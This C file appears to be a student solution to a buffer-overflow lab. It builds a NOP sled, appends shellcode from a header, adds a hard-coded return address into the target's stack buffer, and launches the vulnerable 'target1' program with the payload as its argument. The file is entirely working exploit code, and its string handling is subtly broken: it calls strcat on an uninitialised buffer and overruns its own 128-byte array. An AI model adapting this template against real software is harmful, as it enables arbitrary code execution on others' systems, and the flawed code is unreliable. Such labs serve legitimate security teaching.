#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	args[0] = TARGET;

	char sploit_str[128];
	int sploit_len = 128;

	// target1 &buf is located at 0x2021fe50 to 0x2021feb0 (96 = 0x60)
	// Little Endian format
	char target_addr[] = "\x50\xfe\x21\x20";

	// Fill head with NOP
	// Offset 4 for the target buffer address
	for (int i = 0; i < (sploit_len - shellcode_len - 4); ++i)
	{
		strcat(sploit_str, nop);
	}

	// Append the shellcode
	strcat(sploit_str, shellcode);

	// Append the target buffer address
	strcat(sploit_str, target_addr);

	args[1] = sploit_str;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
